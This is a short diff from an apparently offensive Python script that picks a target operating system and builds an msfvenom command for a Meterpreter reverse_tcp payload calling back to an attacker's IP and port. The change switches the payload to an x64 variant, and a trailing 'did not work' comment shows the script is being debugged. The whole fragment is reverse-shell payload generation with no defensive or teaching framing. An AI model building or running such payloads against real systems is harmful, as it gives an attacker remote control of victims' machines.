@@ -56,7 +56,7 @@ elif osInfo.find("solarlis") !=-1:
     os = "solaris"
     print(os)
 
-payload = "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"      
+payload = "msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"      
 print(payload)
 payload = filename
 print(payload) ---did not work
